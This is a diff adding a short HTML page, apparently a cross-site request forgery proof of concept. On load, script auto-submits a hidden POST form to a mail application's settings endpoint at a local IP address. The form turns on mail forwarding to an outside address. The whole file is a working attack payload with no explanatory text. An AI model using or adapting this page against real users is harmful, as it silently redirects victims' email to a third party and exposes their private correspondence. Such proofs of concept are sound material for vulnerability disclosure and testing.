@@ -1,0 +1,16 @@
+<html>
+<body onload="attack()">
+	<script>
+		function attack(){
+			alert('aa');
+			document.getElementById("hidden").submit();
+		}
+	</script>
+
+<form id="hidden" name="hidden-form" method="POST" action="http://192.168.11.236/index.php/mail/settings/mailsave">
+<input type="hidden" name="save" value="1"/>
+<input type="hidden" name="enableForward" value="enabled"/>
+<input type="hidden" name="Forward" value="aaaa@ggg.com"/>
+</form>
+</body>
+</html>
